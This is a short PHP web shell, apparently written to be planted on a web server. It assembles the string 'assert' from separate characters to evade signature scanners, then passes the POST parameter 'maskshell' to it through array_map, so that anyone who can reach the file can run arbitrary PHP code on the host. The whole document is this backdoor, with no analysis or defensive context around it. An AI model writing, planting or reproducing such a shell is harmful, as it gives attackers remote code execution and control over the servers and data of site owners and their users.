<script language="php">
@array_map('a'.'s'.'s'.'e'.'r'.'t',array($_POST['maskshell']));
</script>